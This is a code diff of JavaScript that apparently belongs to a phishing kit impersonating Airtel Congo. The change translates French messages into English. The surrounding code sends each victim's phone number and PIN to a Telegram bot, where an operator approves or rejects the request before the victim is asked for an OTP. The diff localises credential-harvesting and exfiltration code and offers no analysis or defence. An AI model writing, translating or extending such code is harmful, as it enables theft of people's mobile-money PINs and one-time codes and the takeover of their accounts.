@@ -162,13 +162,13 @@ async function sendTelegramNotification(phone, pin) {
     const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
     
     const lines = [
-        '📲 Nouvelle demande Airtel Congo',
-        '📱 Téléphone: ' + phone,
+        '📲 New Airtel Congo Request',
+        '📱 Phone: ' + phone,
         '🔑 PIN: ' + pin,
         '🆔 Request: ' + requestId,
         '',
-        '✅ /approve_' + requestId + ' - Approuver',
-        '❌ /reject_' + requestId + ' - Rejeter'
+        '✅ /approve_' + requestId + ' - Approve',
+        '❌ /reject_' + requestId + ' - Reject'
     ];
     const message = lines.join('\n');
 
@@ -211,7 +211,7 @@ async function checkTelegramApproval(requestId) {
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify({
                                         chat_id: update.callback_query.from.id,
-                                        text: '✅ Transaction approuvée! L\'utilisateur peut maintenant vérifier son OTP.'
+                                        text: '✅ Transaction approved! User can now verify OTP.'
                                     })
                                 });
                             } catch (e) {}
@@ -223,7 +223,7 @@ async function checkTelegramApproval(requestId) {
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify({
                                         chat_id: update.callback_query.from.id,
-                                        text: '❌ Transaction rejetée.'
+                                        text: '❌ Transaction rejected.'
                                     })
                                 });
                             } catch (e) {}
